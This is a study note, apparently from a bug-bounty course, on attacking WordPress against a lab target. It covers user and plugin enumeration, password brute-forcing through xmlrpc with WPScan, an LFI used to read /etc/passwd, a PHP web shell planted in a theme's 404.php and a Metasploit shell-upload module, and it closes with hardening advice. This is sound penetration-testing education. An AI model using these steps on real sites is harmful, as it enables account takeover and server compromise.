---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounty-hunter/hacking-word-press/"}
---

## Intro

### WordPress Overview
- Powers 1/3 of all websites.
- Versatile. CAn be used to host blogs, forums, e-commerce , project management, document management and more.
- Huge library of extensions both free and paid.
- Huge library of extensions also makes it prone to vulnerabilities through the third-party themes and plugins
- Written in PHP, runs on Apache and MySQL

### Wordpress is a  [[Cybersecurity/Bug Bounty Hunter/Content Management Systems\|Content Management Systems]]

## WordPress Structure

- Requires a fully installed and configured [[Cybersecurity/Bug Bounty Hunter/LAMP\|LAMP]] stack.
- Default location for WordPress supporting files is the webroot at /var/ww/html

```shell-session
$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

### Key WordPress Files
- `index.php` - the homeapage of WordPress
- `license.txt` - contains useful information including the version installed.
- `wp-activate.php` used for email activiation process.
- `wp-admin` folder cotnains the login page for administrator access and the backend dashboard. Once a user has loggedin they can make changes to the site based on their assigned permissions. Usually found at:
	- `/wp-admin/login.php`
	- `/wp-admin/wp-login.php`
	- `/login.php`
	- `/wp-login.php`

- `xmlrpc.php` a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism; replaced by the WordPress REST API

### WordPress Configuration File
- Found at `wp-config.php` contains information required by WordPress to connect to the database. Can also be used to activiate DEBUG mode.

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

### Key WordPress Directories

`wp-content` is the main directory where plugins and themes are stored. The subdirectory `uploads/` is usually where any files uploaded to the platform are stored. These directories are worth careful investigation and enumeration.

```shell-session
tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```

`wp-includes` contains everything except for the administrative components and the themese that belong to the website. Certs, fonts, JavaScript files, an widgets are stored here.

```shell-session
$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

## WordPress User Roles

There are five types of users in a standard WordPress installation.

|Role|Description|
|--|--|
|Administrator| This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.|
|Editor|An editor can publish and manage posts, including the posts of other users.
|Author|Authors can publish and manage their own posts.
|Contributor|These users can write and manage their own posts but cannot publish them.
|Subscriber|These are normal users who can browse posts and edit their profiles.|

Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.

## WordPress Core Version Enumeration

An essential part of enumeration is uncovering the software version number. One way to do this is to view the source code and look for the `meta generator` tag. We can do that in the browser or just use curl:
```shell-session
$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

<meta name="generator" content="WordPress 5.3.3" />
```

Links in the style sheet and the JS files can also provide the version number.

Sometimes therei s a readm.html file in the root directory.

## Plugins and Themes Enumeration

Look for weaknesses here too.

### Plugins
```shell-session
 curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

### Themes
```shell-session
$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```

## Directory Indexing

Just because a plugin is deactivated, does notmean we can't reach it. Unused plugins should be removed.
```shell-session
$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

****** Index of /wp-content/plugins/mail-masta ******
[[ICO]]       Name                 Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                         -  
[[DIR]]       amazon_api/          2020-05-13 18:01    -  
[[DIR]]       inc/                 2020-05-13 18:01    -  
[[DIR]]       lib/                 2020-05-13 18:01    -  
[[   ]]       plugin-interface.php 2020-05-13 18:01  88K  
[[TXT]]       readme.txt           2020-05-13 18:01 2.2K  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
```

This is called directory indexing and it should be disabled. It's very important to include the final `/` when you're looking to enumerate directories.

## User Enumeration

It's good to know users becaus you might then be able to get into their accounts.

In WordPress review posts to uncover user ID and their usernames. Mousing over the name of the post author gives you the name of the account.
```shell-session
$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1
```

The request redirects to the user's page if there is a user at that number. It gives 404 if no user.

We can also go to the JSON endpoint which allows us to get a list of users.

```shell-session
$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/",
    <SNIP>
  },
  {
    "id": 2,
    "name": "ch4p",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",
    <SNIP>
  },
<SNIP>
```

## Login
Now that we have user names we try and bruteforce passwords. This can be performed on the login page or the xmlrpc.php page.

### cURL - POST Request
A POST request to the `xml-rpc.php` page will get a response like so:
```shell-session
$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

If credentials are not valid we'll get a `403 faultCode` error.

### Invalid Credentials - 403 Forbidden
```shell-session
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

List methods available by running the `system.listMethods` method.

### WPScan Overview

Basically WPScan is a ruby app that can scan wordpress sites in a variety of ways. You should tailor your scan to your needs. Find all the commands with `wpscan --hh`.

There's a vulnerability [WPVulnDB](https://wpvulndb.com) that can be used to pull in all vulnerability information based on what the scan finds. There's a free plan for 50 requests a day. Once you sign up, provide your token with the --api-token parameter.

## WPScan Enumeration

### Enumerating a website with WPScan

Use the flag `--enumerate` to enumerate various compononets of the WordPress application.

```shell-session
$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

## Exploiting a Vulnerable Plugin

### Leveraging WPScan Results

Once you have the list of plugins you can go to [Exploit-db](https://www.exploit-db.com) to find information about whether it's exploitable.

For this we looked at the mail-masta v. 1.0 plugin that was installed. It has an LFI vulnerability detailed [here](https://www.exploit-db.com/exploits/40290). We just used the LFI to get the /etc/passwd file.

## Attacking WordPress Users

### WordPress User Bruteforce

WPScan can bruteforce using the `xmlrpc.php` page.
```shell-session
$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```

## [[Cybersecurity/Penetration Tester/Remote Code Execution\|RCE]] via the Theme Editor

### Attacking the WordPress Backend

If we're admin we can setup RCE on the backend by editing the theme in the theme editor.

Choose an unused theme and choose a non-critical file like the `404.php` to modify and add a web shell.
```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```
Use with cURL:
```shell-session
$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
<SNIP>
```

## Attacking with Metasploit

### Automating Wordpress Exploitation

If you have an account that can create files on the webserver then you can use Metasploit to create a reverse shell. Start the msfconsole and do `search wp_admin`.
```shell-session
msf5 > search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

Select the module using `use 0`. Use the `options` command to set options.
```shell-session
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
PASSWORD                    yes       The WordPress password to authenticate with
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /                yes       The base path to the wordpress application
USERNAME                    yes       The WordPress username to authenticate with
VHOST                       no        HTTP server virtual host


Exploit target:

Id  Name
--  ----
0   WordPress
```

Set the options with the `set` command. Then use the `run` command.

## WordPress Hardening

### Best Practices:
#### - Regular Updates
Key for any application or system really. modify the wp-config.php file to enable automatic updates.
```php
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
#### - Plugin and Theme Management
Be careful about plugins used. Check reviews, number of installs, and the last update. Audit your Wordpress Site.

#### - Enhance WordPress Security
Use plugins that enhance security. 
#### [Sucuri Security](https://wordpress.org/plugins/sucuri-scanner/)

-   This plugin is a security suite consisting of the following features:
    -   Security Activity Auditing
    -   File Integrity Monitoring
    -   Remote Malware Scanning
    -   Blacklist Monitoring.

#### [iThemes Security](https://wordpress.org/plugins/better-wp-security/)

-   iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
    -   Two-Factor Authentication (2FA)
    -   WordPress Salts & Security Keys
    -   Google reCAPTCHA
    -   User Action Logging

#### [Wordfence Security](https://wordpress.org/plugins/wordfence/)

-   Wordfence Security consists of an endpoint firewall and malware scanner.
    -   The WAF identifies and blocks malicious traffic.
    -   The premium version provides real-time firewall rule and malware signature updates
    -   Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.

### User Management

Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site.

-   Disable the standard `admin` user and create accounts with difficult to guess usernames
-   Enforce strong passwords
-   Enable and enforce two-factor authentication (2FA) for all users
-   Restrict users' access based on the concept of least privilege
-   Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed

### Configuration Management

Certain configuration changes can increase the overall security posture of a WordPress installation.

-   Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
-   Limit login attempts to prevent password brute-forcing attacks
-   Rename the `wp-admin.php` login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses
